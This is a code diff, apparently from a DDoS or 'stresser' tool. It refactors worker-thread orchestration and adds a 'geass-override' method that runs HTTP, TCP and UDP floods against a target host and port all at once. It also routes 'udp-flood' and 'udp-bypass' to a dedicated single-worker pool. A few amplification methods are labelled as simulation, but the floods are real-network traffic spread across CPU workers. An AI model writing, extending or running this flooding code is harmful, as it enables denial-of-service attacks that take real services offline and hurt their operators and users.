@@ -92,26 +92,16 @@ async function runL3Simulation(
 }
 
 // ─────────────────────────────────────────────────────────────────────────
-//  RUN ATTACK — spawns CPU_COUNT workers, each with threads/N load
+//  SPAWN POOL — spawns numWorkers workers for a single method
 // ─────────────────────────────────────────────────────────────────────────
-async function runAttackWorkers(
+function spawnPool(
   method: string, target: string, port: number, threads: number,
-  signal: AbortSignal, onStats: (p: number, b: number) => void,
+  numWorkers: number, signal: AbortSignal, onStats: (p: number, b: number) => void,
 ): Promise<void> {
-  // Simulation methods run inline (no network, just math)
-  const SIM_METHODS = new Set(["icmp-flood","dns-amp","ntp-amp","mem-amp","ssdp-amp"]);
-  if (SIM_METHODS.has(method)) {
-    await runL3Simulation(method, threads, signal, onStats);
-    return;
-  }
-
-  // All real-network methods use worker_threads
-  const numWorkers = CPU_COUNT;
   const threadsPerWorker = Math.max(1, Math.floor(threads / numWorkers));
   const workers: Worker[] = [];
 
   return new Promise<void>((resolve) => {
-    // Use a Set so each worker only counts once no matter how many events fire
     const finished = new Set<number>();
     let resolved = false;
     const tryResolve = () => { if (!resolved && finished.size >= numWorkers) { resolved = true; resolve(); } };
@@ -125,26 +115,66 @@ async function runAttackWorkers(
       const idx = i;
       workers.push(w);
 
-      // Stats messages
       w.on("message", (msg: { pkts?: number; bytes?: number; done?: boolean }) => {
         if (msg.pkts !== undefined && msg.bytes !== undefined) onStats(msg.pkts, msg.bytes);
         if (msg.done) { finished.add(idx); tryResolve(); }
       });
-      // Worker crash / unexpected exit — count as done so we don't hang
       w.on("error", () => { finished.add(idx); tryResolve(); });
       w.on("exit",  () => { finished.add(idx); tryResolve(); });
     }
 
-    // Stop all workers when signal aborts
     signal.addEventListener("abort", () => {
       workers.forEach(w => { try { w.postMessage("stop"); } catch { /**/ } });
-      // Force-terminate after 2s as safety net
       setTimeout(() => {
         workers.forEach(w => { try { w.terminate(); } catch { /**/ } });
         if (!resolved) { resolved = true; resolve(); }
       }, 2000);
     }, { once: true });
   });
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  RUN ATTACK — spawns CPU_COUNT workers, each with threads/N load
+// ─────────────────────────────────────────────────────────────────────────
+async function runAttackWorkers(
+  method: string, target: string, port: number, threads: number,
+  signal: AbortSignal, onStats: (p: number, b: number) => void,
+): Promise<void> {
+  // Simulation methods run inline (no network, just math)
+  const SIM_METHODS = new Set(["icmp-flood","dns-amp","ntp-amp","mem-amp","ssdp-amp"]);
+  if (SIM_METHODS.has(method)) {
+    await runL3Simulation(method, threads, signal, onStats);
+    return;
+  }
+
+  // UDP attacks: SINGLE worker with multiple sockets (multi-worker UDP deadlocks in this env)
+  // numSockets inside the worker = min(threads, 8), so pass full thread count to 1 worker
+  const UDP_METHODS = new Set(["udp-flood", "udp-bypass"]);
+  if (UDP_METHODS.has(method)) {
+    await spawnPool(method, target, port, threads, 1, signal, onStats);
+    return;
+  }
+
+  // Geass Override: triple vector with SEPARATE worker pools per attack type
+  // HTTP/TCP use multi-worker pools; UDP stays as single worker (see above)
+  if (method === "geass-override") {
+    const httpW = Math.ceil(CPU_COUNT * 0.50);  // 4 workers → HTTP pipeline
+    const tcpW  = Math.ceil(CPU_COUNT * 0.25);  // 2 workers → TCP flood
+
+    const httpT = Math.max(1, Math.round(threads * 0.50));
+    const tcpT  = Math.max(1, Math.round(threads * 0.25));
+    const udpT  = Math.max(1, threads - httpT - tcpT);
+
+    await Promise.all([
+      spawnPool("http-flood", target, port, httpT, httpW, signal, onStats),
+      spawnPool("tcp-flood",  target, port, tcpT,  tcpW,  signal, onStats),
+      spawnPool("udp-flood",  target, port, udpT,  1,     signal, onStats), // 1 UDP worker
+    ]);
+    return;
+  }
+
+  // All other real-network methods: single pool of CPU_COUNT workers
+  await spawnPool(method, target, port, threads, CPU_COUNT, signal, onStats);
 }
 
 // ── Routes ────────────────────────────────────────────────────────────────
